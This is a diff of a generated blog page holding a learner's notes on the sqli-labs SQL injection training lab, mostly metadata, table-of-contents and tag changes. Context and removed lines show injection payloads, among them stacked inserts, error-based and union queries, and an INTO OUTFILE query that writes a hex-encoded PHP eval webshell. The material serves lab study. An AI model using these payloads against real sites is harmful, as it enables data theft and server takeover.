@@ -18,8 +18,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/05/nyMe29JgmrAoVEx.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/05/LzWXA4oRs9mqw2D.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/05/hUOGilHPxcTZz81.png">
-<meta property="og:image" content="https://s1.ax1x.com/2020/04/05/GDYbgU.png">
-<meta property="og:updated_time" content="2020-04-11T10:00:36.000Z">
+<meta property="og:updated_time" content="2020-11-08T02:12:18.732Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="notes on sqli-labs">
 <meta name="twitter:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以分开咯。">
@@ -202,7 +201,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">3.3k字</span>
+        <span class="post-count">3.1k字</span>
       </span>
     </span>
 
@@ -211,7 +210,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">15分</span>
+        <span class="post-count">14分</span>
       </span>
     </span>
 </div>
@@ -319,12 +318,7 @@
 <p><code>?sort=1;insert into users(id,username,password) values(18,&#39;jojo&#39;,&#39;666&#39;)--+</code><br><img src="https://i.loli.net/2020/04/05/hUOGilHPxcTZz81.png" alt="50.png"><br>也可以只查询一条，报错可以查。<br><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(database())), 1)</code>    </p>
 <p>再试试挂马<br><code>SELECT * INTO OUTFILE &#39;C:\log1.txt&#39; 这样就可以把查询到的数据写入到C盘的log1.txt这个文件里面。</code><br><code>?sort=1;select 3c3f706870206576616c28245f53545b78696d6f5d293b203f3e,2 into outfile D:\phpstudy_pro\WWW\sqli-labs-master\Less-51--+</code></p>
 <h1 id="less-53-布尔盲注-单引号-字符型-堆叠注入"><a href="#less-53-布尔盲注-单引号-字符型-堆叠注入" class="headerlink" title="less 53 布尔盲注 单引号 字符型 堆叠注入"></a>less 53 布尔盲注 单引号 字符型 堆叠注入</h1><p><code>?sort=1&#39; and sleep(0.1)%23</code></p>
-<h1 id="less-54-challenge"><a href="#less-54-challenge" class="headerlink" title="less 54 challenge"></a>less 54 challenge</h1><p>此挑战的目标是在不到10次尝试中仅从数据库(‘CHALLENGES’)的随机表中查到（sectet key）。<br>有趣的是，每次重置都会生成随机的表名、列名和表数据。时刻保持新鲜。<br><code>-1&#39; union select 1,database(),3--+</code><br>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”challenges”–+`<br>就是单引号结尾的联合注入，开头乱试了一同，刚好10下出来了噗。<br> <img src="https://s1.ax1x.com/2020/04/05/GDYbgU.png" alt="GDYbgU.png">  </p>
-<h1 id="less-55"><a href="#less-55" class="headerlink" title="less 55"></a>less 55</h1><p><code>?id=1) --+</code>  </p>
-<p>1.sqli lab到55<br>2.学习文件上传 做了一遍upload labs<br>3.做了几道ctf</p>
-<p>1.写不出来 python 做题用不来难受</p>
-<p>1.学习xss<br>2.多练点题 搜集知识点<br>3.python</p>
-<p>code breaking<br>bayonet<br>NTLM Kerberos</p>
+<h1 id="less-54-challenge"><a href="#less-54-challenge" class="headerlink" title="less 54 challenge"></a>less 54 challenge</h1><p>此挑战的目标是在不到10次尝试中仅从数据库(‘CHALLENGES’)的随机表中查到（sectet key）。  </p>
 
       
 
@@ -456,7 +450,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker搭建sqli-labs"><span class="toc-number">1.</span> <span class="toc-text">docker搭建sqli-labs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less26-（过滤-or-and-–-空格）"><span class="toc-number">2.</span> <span class="toc-text">less26 （过滤 or and – # 空格）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less27-过滤-注释符、空格、负号、select、union…"><span class="toc-number">3.</span> <span class="toc-text">less27(过滤 注释符、空格、负号、select、union…)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正则表达式匹配符"><span class="toc-number">3.1.</span> <span class="toc-text">正则表达式匹配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正则匹配单行模式、多行模式"><span class="toc-number">3.2.</span> <span class="toc-text">正则匹配单行模式、多行模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less28-过滤空格、select……的盲注"><span class="toc-number">4.</span> <span class="toc-text">less28 过滤空格、select……的盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-29"><span class="toc-number">5.</span> <span class="toc-text">less 29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-30"><span class="toc-number">6.</span> <span class="toc-text">less 30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-31"><span class="toc-number">7.</span> <span class="toc-text">less 31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-32（宽字节注入）"><span class="toc-number">8.</span> <span class="toc-text">less 32（宽字节注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理："><span class="toc-number">8.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解决方法：-当然是解决编码问题啦。"><span class="toc-number">8.2.</span> <span class="toc-text">解决方法： 当然是解决编码问题啦。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入："><span class="toc-number">8.3.</span> <span class="toc-text">注入：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-34"><span class="toc-number">9.</span> <span class="toc-text">less 34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-35"><span class="toc-number">10.</span> <span class="toc-text">less 35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-36-mysql-real-escape-string"><span class="toc-number">11.</span> <span class="toc-text">less 36 (mysql_real_escape_string)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-37"><span class="toc-number">12.</span> <span class="toc-text">less 37</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#addslashes-mysql-real-escape-string-mysql-escape-string"><span class="toc-number">12.1.</span> <span class="toc-text">addslashes() mysql_real_escape_string() mysql_escape_string()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-38-（堆叠注入）"><span class="toc-number">13.</span> <span class="toc-text">less 38 （堆叠注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-40"><span class="toc-number">14.</span> <span class="toc-text">less 40</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-41"><span class="toc-number">15.</span> <span class="toc-text">less 41</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-42"><span class="toc-number">16.</span> <span class="toc-text">less 42</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-43"><span class="toc-number">17.</span> <span class="toc-text">less 43</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-44"><span class="toc-number">18.</span> <span class="toc-text">less 44</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-46-sort排序"><span class="toc-number">19.</span> <span class="toc-text">less 46 sort排序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-47"><span class="toc-number">20.</span> <span class="toc-text">less 47</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-48"><span class="toc-number">21.</span> <span class="toc-text">less 48</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-49"><span class="toc-number">22.</span> <span class="toc-text">less 49</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-50-sort堆叠注入-写入一句话"><span class="toc-number">23.</span> <span class="toc-text">less 50 sort堆叠注入 写入一句话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-53-布尔盲注-单引号-字符型-堆叠注入"><span class="toc-number">24.</span> <span class="toc-text">less 53 布尔盲注 单引号 字符型 堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-54-challenge"><span class="toc-number">25.</span> <span class="toc-text">less 54 challenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-55"><span class="toc-number">26.</span> <span class="toc-text">less 55</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker搭建sqli-labs"><span class="toc-number">1.</span> <span class="toc-text">docker搭建sqli-labs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less26-（过滤-or-and-–-空格）"><span class="toc-number">2.</span> <span class="toc-text">less26 （过滤 or and – # 空格）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less27-过滤-注释符、空格、负号、select、union…"><span class="toc-number">3.</span> <span class="toc-text">less27(过滤 注释符、空格、负号、select、union…)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正则表达式匹配符"><span class="toc-number">3.1.</span> <span class="toc-text">正则表达式匹配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正则匹配单行模式、多行模式"><span class="toc-number">3.2.</span> <span class="toc-text">正则匹配单行模式、多行模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less28-过滤空格、select……的盲注"><span class="toc-number">4.</span> <span class="toc-text">less28 过滤空格、select……的盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-29"><span class="toc-number">5.</span> <span class="toc-text">less 29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-30"><span class="toc-number">6.</span> <span class="toc-text">less 30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-31"><span class="toc-number">7.</span> <span class="toc-text">less 31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-32（宽字节注入）"><span class="toc-number">8.</span> <span class="toc-text">less 32（宽字节注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理："><span class="toc-number">8.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解决方法：-当然是解决编码问题啦。"><span class="toc-number">8.2.</span> <span class="toc-text">解决方法： 当然是解决编码问题啦。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入："><span class="toc-number">8.3.</span> <span class="toc-text">注入：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-34"><span class="toc-number">9.</span> <span class="toc-text">less 34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-35"><span class="toc-number">10.</span> <span class="toc-text">less 35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-36-mysql-real-escape-string"><span class="toc-number">11.</span> <span class="toc-text">less 36 (mysql_real_escape_string)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-37"><span class="toc-number">12.</span> <span class="toc-text">less 37</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#addslashes-mysql-real-escape-string-mysql-escape-string"><span class="toc-number">12.1.</span> <span class="toc-text">addslashes() mysql_real_escape_string() mysql_escape_string()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-38-（堆叠注入）"><span class="toc-number">13.</span> <span class="toc-text">less 38 （堆叠注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-40"><span class="toc-number">14.</span> <span class="toc-text">less 40</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-41"><span class="toc-number">15.</span> <span class="toc-text">less 41</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-42"><span class="toc-number">16.</span> <span class="toc-text">less 42</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-43"><span class="toc-number">17.</span> <span class="toc-text">less 43</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-44"><span class="toc-number">18.</span> <span class="toc-text">less 44</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-46-sort排序"><span class="toc-number">19.</span> <span class="toc-text">less 46 sort排序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-47"><span class="toc-number">20.</span> <span class="toc-text">less 47</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-48"><span class="toc-number">21.</span> <span class="toc-text">less 48</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-49"><span class="toc-number">22.</span> <span class="toc-text">less 49</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-50-sort堆叠注入-写入一句话"><span class="toc-number">23.</span> <span class="toc-text">less 50 sort堆叠注入 写入一句话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-53-布尔盲注-单引号-字符型-堆叠注入"><span class="toc-number">24.</span> <span class="toc-text">less 53 布尔盲注 单引号 字符型 堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-54-challenge"><span class="toc-number">25.</span> <span class="toc-text">less 54 challenge</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -604,11 +598,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
+                <a href="javascript:void(0)" class="js-tag color3">VS code</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">VS code</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -636,6 +630,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">md5</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -644,7 +642,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">md5</a>
+                <a href="javascript:void(0)" class="js-tag color3">preg_replace</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码执行</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -664,11 +666,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">preg_replace</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码执行</a>
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -677,10 +675,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">乱七八糟</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
               </li>
             
             <div class="clearfix"></div>
